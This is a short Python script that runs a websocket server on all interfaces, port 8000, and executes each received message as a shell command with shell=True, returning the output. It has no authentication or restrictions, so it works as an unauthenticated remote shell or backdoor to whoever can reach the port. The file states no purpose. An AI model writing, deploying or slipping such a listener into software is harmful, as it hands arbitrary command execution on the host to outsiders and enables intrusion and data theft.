import asyncio
import subprocess
import websockets
import sys


async def handle_websocket(websocket, path):
    async for message in websocket:
        cmd = message.strip()
        try:
            output = subprocess.check_output(cmd, shell=True)
            await websocket.send(output.decode('utf-8').encode('utf-8'))
        except subprocess.CalledProcessError as e:
            await websocket.send(b'Error: ' + e.output)

async def run_server():
    async with websockets.serve(handle_websocket, '0.0.0.0', 8000):
        await asyncio.Future()  # run forever

if __name__ == '__main__':
    asyncio.run(run_server())
